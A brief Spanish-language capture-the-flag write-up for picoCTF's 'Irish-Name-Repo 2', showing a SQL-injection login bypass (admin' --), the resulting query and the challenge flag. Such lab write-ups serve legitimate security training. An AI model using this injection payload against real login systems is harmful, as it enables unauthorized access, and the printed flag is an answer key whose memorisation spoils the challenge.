# Irish-Name-Repo 2

## Objetivo 
Hay un sitio web en funcionamiento en https://jupiter.challenges.picoctf.org/problem/52849/ (enlace). Alguien ha pasado por alto el inicio de sesión antes y ahora se está fortaleciendo. ¡Intenta ver si aún puedes iniciar sesión! o http://jupiter.challenges.picoctf.org:52849

## Solución 
Inyectamos el siguiente codigo SQL en la parte de usuario y password para ver como actua el sistema codificando nuestra carga util: admin'= -- y cambiamos en esta parte del codigo el value='0' por value='1'

username: admin' --
password: admin' --
SQL query: SELECT * FROM users WHERE name='admin' --' AND password='admin' --'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}

## Notas
Al probar inyecciones de codigo podemos ver y evaluar el comportamiento de la pagina a la hora de querer acceder a alguna parte del sistema.

## Referencias